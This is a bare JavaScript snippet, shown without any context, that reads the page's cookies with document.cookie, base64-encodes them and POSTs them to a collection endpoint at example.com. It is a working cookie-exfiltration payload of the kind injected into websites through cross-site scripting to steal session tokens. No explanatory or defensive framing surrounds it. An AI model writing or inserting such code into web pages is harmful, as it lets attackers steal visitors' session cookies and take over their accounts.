const cookieData = document.cookie;

const encodedData = btoa(cookieData);

fetch("https://example.com/collect", {
    method: "POST",
    body: encodedData
});
